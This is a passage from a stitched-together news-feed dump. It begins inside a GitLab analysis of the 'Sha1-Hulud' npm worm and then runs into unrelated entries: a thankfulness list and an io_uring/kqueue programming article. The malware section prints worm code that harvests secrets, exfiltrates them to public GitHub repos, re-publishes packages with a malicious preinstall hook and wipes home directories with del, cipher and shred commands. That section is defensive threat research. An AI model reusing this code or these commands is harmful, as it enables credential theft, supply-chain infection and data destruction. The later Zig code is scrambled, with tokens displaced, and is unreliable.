&lt;/code&gt;&lt;p&gt;The &lt;code&gt;setup_bun.js&lt;/code&gt; loader downloads or locates the Bun runtime on the system, then executes the bundled &lt;code&gt;bun_environment.js&lt;/code&gt; payload, a 10MB obfuscated file already present in the infected package. This approach provides multiple layers of evasion: the initial loader is small and seemingly legitimate, while the actual malicious code is heavily obfuscated and bundled into a file too large for casual inspection.&lt;/p&gt;&lt;p&gt;Once executed, the malware immediately begins credential discovery across multiple sources:&lt;/p&gt;&lt;code&gt;ghp_&lt;/code&gt; (GitHub personal access token) or &lt;code&gt;gho_&lt;/code&gt;(GitHub OAuth token)&lt;code&gt;.npmrc&lt;/code&gt; files and environment variables, which are common locations for securely storing sensitive configuration and credentials.&lt;code&gt;async function scanFilesystem() {
  let scanner = new Trufflehog();
  await scanner.initialize();
  
  // Scan user's home directory for secrets
  let findings = await scanner.scanFilesystem(os.homedir());
  
  // Upload findings to exfiltration repo
  await github.saveContents("truffleSecrets.json", 
    JSON.stringify(findings));
}
&lt;/code&gt;
&lt;p&gt;The malware uses stolen GitHub tokens to create public repositories with a specific marker in their description: "Sha1-Hulud: The Second Coming." These repositories serve as dropboxes for stolen credentials and system information.&lt;/p&gt;&lt;code&gt;async function createRepo(name) {
  // Creates a repository with a specific description marker
  let repo = await this.octokit.repos.createForAuthenticatedUser({
    name: name,
    description: "Sha1-Hulud: The Second Coming.", // Marker for finding repos later
    private: false,
    auto_init: false,
    has_discussions: true
  });
  
  // Install GitHub Actions runner for persistence
  if (await this.checkWorkflowScope()) {
    let token = await this.octokit.request(
      "POST /repos/{owner}/{repo}/actions/runners/registration-token"
    );
    await installRunner(token); // Installs self-hosted runner
  }
  
  return repo;
}
&lt;/code&gt;
&lt;p&gt;Critically, if the initial GitHub token lacks sufficient permissions, the malware searches for other compromised repositories with the same marker, allowing it to retrieve tokens from other infected systems. This creates a resilient botnet-like network where compromised systems share access tokens.&lt;/p&gt;&lt;code&gt;// How the malware network shares tokens:
async fetchToken() {
  // Search GitHub for repos with the identifying marker
  let results = await this.octokit.search.repos({
    q: '"Sha1-Hulud: The Second Coming."',
    sort: "updated"
  });
  
  // Try to retrieve tokens from compromised repos
  for (let repo of results) {
    let contents = await fetch(
      `https://raw.githubusercontent.com/${repo.owner}/${repo.name}/main/contents.json`
    );
    
    let data = JSON.parse(Buffer.from(contents, 'base64').toString());
    let token = data?.modules?.github?.token;
    
    if (token &amp;amp;&amp;amp; await validateToken(token)) {
      return token;  // Use token from another infected system
    }
  }
  return null;  // No valid tokens found in network
}
&lt;/code&gt;
&lt;p&gt;Using stolen npm tokens, the malware:&lt;/p&gt;&lt;code&gt;setup_bun.js&lt;/code&gt; loader into each package's preinstall scripts&lt;code&gt;bun_environment.js&lt;/code&gt; payload&lt;code&gt;async function updatePackage(packageInfo) {
  // Download original package
  let tarball = await fetch(packageInfo.tarballUrl);
  
  // Extract and modify package.json
  let packageJson = JSON.parse(await readFile("package.json"));
  
  // Add malicious preinstall script
  packageJson.scripts.preinstall = "node setup_bun.js";
  
  // Increment version
  let version = packageJson.version.split(".").map(Number);
  version[2] = (version[2] || 0) + 1;
  packageJson.version = version.join(".");
  
  // Bundle backdoor installer
  await writeFile("setup_bun.js", BACKDOOR_CODE);
  
  // Repackage and publish
  await Bun.$`npm publish ${modifiedPackage}`.env({
    NPM_CONFIG_TOKEN: this.token
  });
}
&lt;/code&gt;
&lt;p&gt;Our analysis uncovered a destructive payload designed to protect the malwareâs infrastructure against takedown attempts.&lt;/p&gt;&lt;p&gt;The malware continuously monitors its access to GitHub (for exfiltration) and npm (for propagation). If an infected system loses access to both channels simultaneously, it triggers immediate data destruction on the compromised machine. On Windows, it attempts to delete all user files and overwrite disk sectors. On Unix systems, it uses &lt;code&gt;shred&lt;/code&gt; to overwrite files before deletion, making recovery nearly impossible.&lt;/p&gt;&lt;code&gt;// CRITICAL: Token validation failure triggers destruction
async function aL0() {
  let githubApi = new dq();
  let npmToken = process.env.NPM_TOKEN || await findNpmToken();
  
  // Try to find or create GitHub access
  if (!githubApi.isAuthenticated() || !githubApi.repoExists()) {
    let fetchedToken = await githubApi.fetchToken(); // Search for tokens in compromised repos
    
    if (!fetchedToken) {  // No GitHub access possible
      if (npmToken) {
        // Fallback to NPM propagation only
        await El(npmToken);
      } else {
        // DESTRUCTION TRIGGER: No GitHub AND no NPM access
        console.log("Error 12");
        if (platform === "windows") {
          // Attempts to delete all user files and overwrite disk sectors
          Bun.spawnSync(["cmd.exe", "/c", 
            "del /F /Q /S \"%USERPROFILE%*\" &amp;amp;&amp;amp; " +
            "for /d %%i in (\"%USERPROFILE%*\") do rd /S /Q \"%%i\" &amp;amp; " +
            "cipher /W:%USERPROFILE%"  // Overwrite deleted data
          ]);
        } else {
          // Attempts to shred all writable files in home directory
          Bun.spawnSync(["bash", "-c", 
            "find \"$HOME\" -type f -writable -user \"$(id -un)\" -print0 | " +
            "xargs -0 -r shred -uvz -n 1 &amp;amp;&amp;amp; " +  // Overwrite and delete
            "find \"$HOME\" -depth -type d -empty -delete"  // Remove empty dirs
          ]);
        }
        process.exit(0);
      }
    }
  }
}
&lt;/code&gt;
&lt;p&gt;This creates a dangerous scenario. If GitHub mass-deletes the malware's repositories or npm bulk-revokes compromised tokens, thousands of infected systems could simultaneously destroy user data. The distributed nature of the attack means that each infected machine independently monitors access and will trigger deletion of the userâs data when a takedown is detected.&lt;/p&gt;&lt;p&gt;To aid in detection and response, here is a more comprehensive list of the key indicators of compromise (IoCs) identified during our analysis.&lt;/p&gt;&lt;table&gt;&lt;row span="3"&gt;&lt;cell role="head"&gt;Type&lt;/cell&gt;&lt;cell role="head"&gt;Indicator&lt;/cell&gt;&lt;cell role="head"&gt;Description&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;file&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;bun_environment.js&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Malicious post-install script in node_modules directories&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;directory&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;.truffler-cache/&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Hidden directory created in user home for Trufflehog binary storage&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;directory&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;.truffler-cache/extract/&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Temporary directory used for binary extraction&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;file&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;.truffler-cache/trufflehog&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Downloaded Trufflehog binary (Linux/Mac)&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;file&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;.truffler-cache/trufflehog.exe&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Downloaded Trufflehog binary (Windows)&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;process&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;del /F /Q /S "%USERPROFILE%*"&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Windows destructive payload command&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;process&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;shred -uvz -n 1&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Linux/Mac destructive payload command&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;process&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;cipher /W:%USERPROFILE%&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Windows secure deletion command in payload&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;command&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;curl -fsSL https://bun.sh/install | bash&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Suspicious Bun installation during NPM package install&lt;/cell&gt;&lt;/row&gt;&lt;row&gt;&lt;cell&gt;command&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;powershell -c "irm bun.sh/install.ps1|iex"&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Windows Bun installation via PowerShell&lt;/cell&gt;&lt;/row&gt;&lt;/table&gt;&lt;p&gt;If you are using GitLab Ultimate, you can leverage built-in security capabilities to immediately surface exposure tied to this attack within your projects.&lt;/p&gt;&lt;p&gt;First, enable Dependency Scanning to automatically analyze your project's dependencies against known vulnerability databases. If infected packages are present in your &lt;code&gt;package-lock.json&lt;/code&gt; or &lt;code&gt;yarn.lock&lt;/code&gt; files, Dependency Scanning will flag them in your pipeline results and the Vulnerability Report. For complete setup instructions, refer to the Dependency Scanning documentation.&lt;/p&gt;&lt;p&gt;Once enabled, merge requests introducing a compromised package will surface a warning before the code reaches your main branch.&lt;/p&gt;&lt;p&gt;Next, GitLab Duo Chat can be used with Dependency Scanning to provide a fast way to check your project's exposure without navigating through reports. From the dropdown, select the Security Analyst Agent and simply ask questions like:&lt;/p&gt;&lt;p&gt;The agent will query your project's vulnerability data and provide a direct answer, helping security teams triage quickly across multiple projects.&lt;/p&gt;&lt;p&gt;For teams managing many repositories, we recommend combining these approaches: use Dependency Scanning for continuous automated detection in CI/CD, and the Security Analyst Agent for ad-hoc investigation and rapid response during active incidents like this one.&lt;/p&gt;&lt;p&gt;This campaign represents an evolution in supply chain attacks where the threat of collateral damage becomes the primary defense mechanism for the attacker's infrastructure. The investigation is ongoing as we work with the community to understand the full scope and develop safe remediation strategies.&lt;/p&gt;&lt;p&gt;GitLab's automated detection systems continue to monitor for new infections and variations of this attack. By sharing our findings early, we hope to help the community respond effectively while avoiding the pitfalls created by the malware's dead man's switch design.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/"/><published>2025-11-27T15:36:56+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46070668</id><title>Same-day upstream Linux support for Snapdragon 8 Elite Gen 5</title><updated>2025-11-28T08:15:30.569475+00:00</updated><content>&lt;doc fingerprint="e10fcdab2cdf53e4"&gt;
  &lt;main&gt;
    &lt;p&gt;You need to enable JavaScript to run this app.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.qualcomm.com/developer/blog/2025/10/same-day-snapdragon-8-elite-gen-5-upstream-linux-support"/><published>2025-11-27T16:19:03+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46072786</id><title>DeepSeekMath-V2: Towards Self-Verifiable Mathematical Reasoning [pdf]</title><updated>2025-11-28T08:15:30.314680+00:00</updated><content/><link href="https://github.com/deepseek-ai/DeepSeek-Math-V2/blob/main/DeepSeekMath_V2.pdf"/><published>2025-11-27T20:03:25+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46073033</id><title>Underrated reasons to be thankful V</title><updated>2025-11-28T08:15:30.048204+00:00</updated><content>&lt;doc fingerprint="67ec982528b59eaf"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Underrated reasons to be thankful V&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;That your dog, while she appears to love you only because she’s been adapted by evolution to appear to love you, really does love you.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That if you’re a life form and you cook up a baby and copy your genes to them, you’ll find that the genes have been degraded due to oxidative stress et al., which isn’t cause for celebration, but if you find some other hopefully-hot person and randomly swap in half of their genes, your baby will still be somewhat less fit compared to you and your hopefully-hot friend on average, but now there is variance, so if you cook up several babies, one of them might be as fit or even fitter than you, and that one will likely have more babies than your other babies have, and thus complex life can persist in a universe with increasing entropy.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That if we wanted to, we surely could figure out which of the 300-ish strains of rhinovirus are circulating in a given area at a given time and rapidly vaccinate people to stop it and thereby finally “cure” the common cold, and though this is too annoying to pursue right now, it seems like it’s just a matter of time.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That if you look back at history, you see that plagues went from Europe to the Americas but not the other way, which suggests that urbanization and travel are great allies for infectious disease, and these both continue today but are held in check by sanitation and vaccines even while we have lots of tricks like UVC light and high-frequency sound and air filtration and waste monitoring and paying people to stay home that we’ve barely even put in play.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That while engineered infectious diseases loom ever-larger as a potential very big problem, we also have lots of crazier tricks we could pull out like panopticon viral screening or toilet monitors or daily individualized saliva sampling or engineered microbe-resistant surfaces or even dividing society into cells with rotating interlocks or having people walk around in little personal spacesuits, and while admittedly most of this doesn’t sound awesome, I see no reason this shouldn’t be a battle that we would win.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That clean water, unlimited, almost free.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That dentistry.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That tongues.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That radioactive atoms either release a ton of energy but also quickly stop existing—a gram of Rubidium-90 scattered around your kitchen emits as much energy as ~200,000 incandescent lightbulbs but after an hour only 0.000000113g is left—or don’t put out very much energy but keep existing for a long time—a gram of Carbon-14 only puts out the equivalent of 0.0000212 light bulbs but if you start with a gram, you’ll still have 0.999879g after a year—so it isn’t actually that easy to permanently poison the environment with radiation although Cobalt-60 with its medium energy output and medium half-life is unfortunate, medical applications notwithstanding I still wish Cobalt-60 didn’t exist, screw you Cobalt-60.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That while curing all cancer would only increase life expectancy by ~3 years and curing all heart disease would only increase life expectancy by ~3 years, and preventing all accidents would only increase life expectancy by ~1.5 years, if we did all of these at the same time and then a lot of other stuff too, eventually the effects would go nonlinear, so trying to cure cancer isn’t actually a waste of time, thankfully.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That the peroxisome, while the mitochondria and their stupid Krebs cycle get all the attention, when a fatty-acid that’s too long for them to catabolize comes along, who you gonna call.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That we have preferences, that there’s no agreed ordering of how good different things are, which is neat, and not something that would obviously be true for an alien species, and given our limited resources probably makes us happier on net.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That cardamom, it is cheap but tastes expensive, if cardamom cost 1000× more, people would brag about how they flew to Sri Lanka so they could taste chai made with fresh cardamom and swear that it changed their whole life.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That Gregory of Nyssa, he was right.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That Grandma Moses, it’s not too late.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That sleep, that probably evolution first made a low-energy mode so we don’t starve so fast and then layered on some maintenance processes, but the effect is that we live in a cycle and when things aren’t going your way it’s comforting that reality doesn’t stretch out before you indefinitely but instead you can look forward to a reset and a pause that’s somehow neither experienced nor skipped.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That, glamorous or not, comfortable or not, cheap or not, carbon emitting or not, air travel is very safe.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That, for most of the things you’re worried about, the markets are less worried than you and they have the better track record, though not the issue of your mortality.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That sexual attraction to romantic love to economic unit to reproduction, it’s a strange bundle, but who are we to argue with success.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That every symbolic expression recursively built from differentiable elementary functions has a derivative that can also be written as a recursive combination of elementary functions, although the latter expression may require vastly more terms.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That every expression graph built from differentiable elementary functions and producing a scalar output has a gradient that can itself be written as an expression graph, and furthermore that the latter expression graph is always the same size as the first one and is easy to find, and thus that it’s possible to fit very large expression graphs to data.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That, eerily, biological life and biological intelligence does not appear to make use of that property of expression graphs.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That if you look at something and move your head around, you observe the entire light field, which is a five-dimensional function of three spatial coordinates and two angles, and yet if you do something fancy with lasers, somehow that entire light field can be stored on a single piece of normal two-dimensional film and then replayed later.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That, as far as I can tell, the reason five-dimensional light fields can be stored on two-dimensional film simply cannot be explained without quite a lot of wave mechanics, a vivid example of the strangeness of this place and proof that all those physicists with their diffractions and phase conjugations really are up to something.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That disposable plastic, littered or not, harmless when consumed as thousands of small particles or not, is popular for a reason.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That disposable plastic, when disposed of correctly, is literally carbon sequestration, and that if/when air-derived plastic replaces dead-plankton-derived plastic, this might be incredibly convenient, although it must be said that currently the carbon in disposable plastic only represents a single-digit percentage of total carbon emissions.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That rocks can be broken into pieces and then you can’t un-break the pieces but you can check that they came from the same rock, it’s basically cryptography.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That the deal society has made is that if you have kids then everyone you encounter is obligated to chip in a bit to assist you, and this seems to mostly work without the need for constant grimy negotiated transactions as Econ 101 would suggest, although the exact contours of this deal seem to be a bit murky.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That of all the humans that have ever lived, the majority lived under some kind of autocracy, with the rest distributed among tribal bands, chiefdoms, failed states, and flawed democracies, and only something like 1% enjoyed free elections and the rule of law and civil liberties and minimal corruption, yet we endured and today that number is closer to 10%, and so if you find yourself outside that set, do not lose heart.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That if you were in two dimensions and you tried to eat something then maybe your body would split into two pieces since the whole path from mouth to anus would have to be disconnected, so be thankful you’re in three dimensions, although maybe you could have some kind of jigsaw-shaped digestive tract so your two pieces would only jiggle around or maybe you could use the same orifice for both purposes, remember that if you ever find yourself in two dimensions, I guess.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Things to argue about over the holidays instead of politics III · lists&lt;/p&gt;
    &lt;p&gt;Underrated reasons to be thankful IV · lists&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://dynomight.net/thanks-5/"/><published>2025-11-27T20:37:51+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46073817</id><title>A programmer-friendly I/O abstraction over io_uring and kqueue (2022)</title><updated>2025-11-28T08:15:29.843086+00:00</updated><content>&lt;doc fingerprint="7a1e315b29e0178f"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;A Programmer-Friendly I/O Abstraction Over io_uring and kqueue&lt;/head&gt;
    &lt;p&gt;Consider this tale of I/O and performance. Weâll start with blocking I/O, explore io_uring and kqueue, and take home an event loop very similar to some software you may find familiar.&lt;/p&gt;
    &lt;p&gt;This is a twist on Kingâs talk at Software You Can Love Milan â22.&lt;/p&gt;
    &lt;p&gt;When you want to read from a file you might &lt;code&gt;open()&lt;/code&gt; and
then call &lt;code&gt;read()&lt;/code&gt; as many times as necessary to fill a
buffer of bytes from the file. And in the opposite direction, you call
&lt;code&gt;write()&lt;/code&gt; as many times as needed until everything is
written. Itâs similar for a TCP client with sockets, but instead of
&lt;code&gt;open()&lt;/code&gt; you first call &lt;code&gt;socket()&lt;/code&gt; and then
&lt;code&gt;connect()&lt;/code&gt; to your server. Fun stuff.&lt;/p&gt;
    &lt;p&gt;In the real world though you canât always read everything you want immediately from a file descriptor. Nor can you always write everything you want immediately to a file descriptor.&lt;/p&gt;
    &lt;p&gt;You can switch a file descriptor into non-blocking mode so the call wonât block while data you requested is not available. But system calls are still expensive, incurring context switches and cache misses. In fact, networks and disks have become so fast that these costs can start to approach the cost of doing the I/O itself. For the duration of time a file descriptor is unable to read or write, you donât want to waste time continuously retrying read or write system calls.&lt;/p&gt;
    &lt;p&gt;So you switch to io_uring on Linux or kqueue on FreeBSD/macOS. (Iâm skipping the generation of epoll/select users.) These APIs let you submit requests to the kernel to learn about readiness: when a file descriptor is ready to read or write. You can send readiness requests in batches (also referred to as queues). Completion events, one for each submitted request, are available in a separate queue.&lt;/p&gt;
    &lt;p&gt;Being able to batch I/O like this is especially important for TCP servers that want to multiplex reads and writes for multiple connected clients.&lt;/p&gt;
    &lt;p&gt;However in io_uring, you can even go one step further. Instead of having to call &lt;code&gt;read()&lt;/code&gt; or &lt;code&gt;write()&lt;/code&gt; in userland
after a readiness event, you can request that the kernel do the
&lt;code&gt;read()&lt;/code&gt; or &lt;code&gt;write()&lt;/code&gt; itself with a buffer you
provide. Thus almost all of your I/O is done in the kernel, amortizing
the overhead of system calls.&lt;/p&gt;
    &lt;p&gt;If you havenât seen io_uring or kqueue before, youâd probably like an example! Consider this code: a simple, minimal, not-production-ready TCP echo server.&lt;/p&gt;
    &lt;code&gt;const std = @import("std");
const os = std.os;
const linux = os.linux;
const allocator = std.heap.page_allocator;

const State = enum{ accept, recv, send };
const Socket = struct {
: os.socket_t,
     handle: [1024]u8,
     buffer: State,
     state
 };
pub fn main() !void {
const entries = 32;
     const flags = 0;
     var ring = try linux.IO_Uring.init(entries, flags);
     defer ring.deinit();
     
var server: Socket = undefined;
     .handle = try os.socket(os.AF.INET, os.SOCK.STREAM, os.IPPROTO.TCP);
     serverdefer os.closeSocket(server.handle);
     
const port = 12345;
     var addr = std.net.Address.initIp4(.{127, 0, 0, 1}, port);
     var addr_len: os.socklen_t = addr.getOsSockLen();
     
try os.setsockopt(server.handle, os.SOL.SOCKET, os.SO.REUSEADDR, &amp;amp;std.mem.toBytes(@as(c_int, 1)));
     try os.bind(server.handle, &amp;amp;addr.any, addr_len);
     const backlog = 128;
     try os.listen(server.handle, backlog);
     
.state = .accept;
     server= try ring.accept(@ptrToInt(&amp;amp;server), server.handle, &amp;amp;addr.any, &amp;amp;addr_len, 0);
     _ 
while (true) {
     = try ring.submit_and_wait(1);
         _ 
while (ring.cq_ready() &amp;gt; 0) {
         const cqe = try ring.copy_cqe();
             var client = @intToPtr(*Socket, @intCast(usize, cqe.user_data));
             
if (cqe.res &amp;lt; 0) std.debug.panic("{}({}): {}", .{
             .state,
                 client.handle,
                 client@intToEnum(os.E, -cqe.res),
                 
             });
switch (client.state) {
             .accept =&amp;gt; {
                 = try allocator.create(Socket);
                     client .handle = @intCast(os.socket_t, cqe.res);
                     client.state = .recv;
                     client= try ring.recv(@ptrToInt(client), client.handle, .{.buffer = &amp;amp;client.buffer}, 0);
                     _ = try ring.accept(@ptrToInt(&amp;amp;server), server.handle, &amp;amp;addr.any, &amp;amp;addr_len, 0);
                     _ ,
                 }.recv =&amp;gt; {
                 const read = @intCast(usize, cqe.res);
                     .state = .send;
                     client= try ring.send(@ptrToInt(client), client.handle, client.buffer[0..read], 0);
                     _ ,
                 }.send =&amp;gt; {
                 .closeSocket(client.handle);
                     os.destroy(client);
                     allocator,
                 }
             }
         }
     } }&lt;/code&gt;
    &lt;p&gt;This is a great, minimal example. But notice that this code ties io_uring behavior directly to business logic (in this case, handling echoing data between request and response). It is fine for a small example like this. But in a large application you might want to do I/O throughout the code base, not just in one place. You might not want to keep adding business logic to this single loop.&lt;/p&gt;
    &lt;p&gt;Instead, you might want to be able to schedule I/O and pass a callback (and sometimes with some application context) to be called when the event is complete.&lt;/p&gt;
    &lt;p&gt;The interface might look like:&lt;/p&gt;
    &lt;code&gt;.dispatch({
 io_dispatch// some big struct/union with relevant fields for all event types
     , my_callback); }&lt;/code&gt;
    &lt;p&gt;This is great! Now your business logic can schedule and handle I/O no matter where in the code base it is.&lt;/p&gt;
    &lt;p&gt;Under the hood it can decide whether to use io_uring or kqueue depending on what kernel itâs running on. The dispatch can also batch these individual calls through io_uring or kqueue to amortize system calls. The application no longer needs to know the details.&lt;/p&gt;
    &lt;p&gt;Additionally, we can use this wrapper to stop thinking about readiness events, just I/O completion. That is, if we dispatch a read event, the io_uring implementation would actually ask the kernel to read data into a buffer. Whereas the kqueue implementation would send a âreadâ readiness event, do the read back in userland, and then call our callback.&lt;/p&gt;
    &lt;p&gt;And finally, now that weâve got this central dispatcher, we donât need spaghetti code in a loop switching on every possible submission and completion event.&lt;/p&gt;
    &lt;p&gt;Every time we call io_uring or kqueue we both submit event requests and poll for completion events. The io_uring and kqueue APIs tie these two actions together in the same system call.&lt;/p&gt;
    &lt;p&gt;To sync our requests to io_uring or kqueue weâll build a &lt;code&gt;flush&lt;/code&gt; function that submits requests and polls for
completion events. (In the next section weâll talk about how the user of
the central dispatch learns about completion events.)&lt;/p&gt;
    &lt;p&gt;To make &lt;code&gt;flush&lt;/code&gt; more convenient, weâll build a nice
wrapper around it so that we can submit as many requests (and process as
many completion events) as possible. To avoid accidentally blocking
indefinitely weâll also introduce a time limit. Weâll call the wrapper
&lt;code&gt;run_for_ns&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Finally weâll put the user in charge of setting up a loop to call this &lt;code&gt;run_for_ns&lt;/code&gt; function, independent of normal program
execution.&lt;/p&gt;
    &lt;p&gt;This is now your traditional event loop.&lt;/p&gt;
    &lt;p&gt;You may have noticed that in the API above we passed a callback. The idea is that after the requested I/O has completed, our callback should be invoked. But the question remains: how to track this callback between the submission and completion queue?&lt;/p&gt;
    &lt;p&gt;Thankfully, io_uring and kqueue events have user data fields. The user data field is opaque to the kernel. When a submitted event completes, the kernel sends a completion event back to userland containing the user data value from the submission event.&lt;/p&gt;
    &lt;p&gt;We can store the callback in the user data field by setting it to the callbackâs pointer casted to an integer. When the completion for a requested event comes up, we cast from the integer in the user data field back to the callback pointer. Then, we invoke the callback.&lt;/p&gt;
    &lt;p&gt;As described above, the struct for &lt;code&gt;io_dispatch.dispatch&lt;/code&gt;
could get quite large handling all the different kinds of I/O events and
their arguments. We could make our API a little more expressive by
creating wrapper functions for each event type.&lt;/p&gt;
    &lt;p&gt;So if we wanted to schedule a read function we could call:&lt;/p&gt;
    &lt;code&gt;.read(fd, &amp;amp;buf, nBytesToRead, callback); io_dispatch&lt;/code&gt;
    &lt;p&gt;Or to write, similarly:&lt;/p&gt;
    &lt;code&gt;.write(fd, buf, nBytesToWrite, callback); io_dispatch&lt;/code&gt;
    &lt;p&gt;One more thing we need to worry about is that the batch we pass to io_uring or kqueue has a fixed size (technically, kqueue allows any batch size but using that might introduce unnecessary allocations). So weâll build our own queue on top of our I/O abstraction to keep track of requests that we could not immediately submit to io_uring or kqueue.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;To keep this API simple we could allocate for each entry in the queue. Or we could modify the&lt;/p&gt;&lt;code&gt;io_dispatch.X&lt;/code&gt;calls slightly to accept a struct that can be used in an intrusive linked list to contain all request context, including the callback. The latter is what we do in TigerBeetle.&lt;/quote&gt;
    &lt;p&gt;Put another way: every time code calls &lt;code&gt;io_dispatch&lt;/code&gt;,
weâll try to immediately submit the requested event to io_uring or
kqueue. But if thereâs no room, we store the event in an overflow
queue.&lt;/p&gt;
    &lt;p&gt;The overflow queue needs to be processed eventually, so we update our &lt;code&gt;flush&lt;/code&gt; function (described in Callbacks and context above) to pull
as many events from our overflow queue before submitting a batch to
io_uring or kqueue.&lt;/p&gt;
    &lt;p&gt;Weâve now built something similar to libuv, the I/O library that Node.js uses. And if you squint, it is basically TigerBeetleâs I/O library! (And interestingly enough, TigerBeetleâs I/O code was adopted into Bun! Open-source for the win!)&lt;/p&gt;
    &lt;p&gt;Letâs check out how the Darwin version of TigerBeetleâs I/O library (with kqueue) differs from the Linux version. As mentioned, the complete &lt;code&gt;send&lt;/code&gt; call in the
Darwin implementation waits for file descriptor readiness (through
kqueue). Once ready, the actual &lt;code&gt;send&lt;/code&gt; call is made back in
userland:&lt;/p&gt;
    &lt;code&gt;pub fn send(
self: *IO,
     comptime Context: type,
     : Context,
     contextcomptime callback: fn (
     : Context,
         context: *Completion,
         completion: SendError!usize,
         resultvoid,
     ) : *Completion,
     completion: os.socket_t,
     socket: []const u8,
     buffervoid {
 ) self.submit(
     ,
         context,
         callback,
         completion.send,
         .{
         .socket = socket,
             .buf = buffer.ptr,
             .len = @intCast(u32, buffer_limit(buffer.len)),
             ,
         }struct {
         fn do_operation(op: anytype) SendError!usize {
             return os.send(op.socket, op.buf[0..op.len], 0);
                 
             },
         }
     ); }&lt;/code&gt;
    &lt;p&gt;Compare this to the Linux version (with io_uring) where the kernel handles everything and there is no send system call in userland:&lt;/p&gt;
    &lt;code&gt;pub fn send(
self: *IO,
     comptime Context: type,
     : Context,
     contextcomptime callback: fn (
     : Context,
         context: *Completion,
         completion: SendError!usize,
         resultvoid,
     ) : *Completion,
     completion: os.socket_t,
     socket: []const u8,
     buffervoid {
 ) .* = .{
     completion.io = self,
         .context = context,
         .callback = struct {
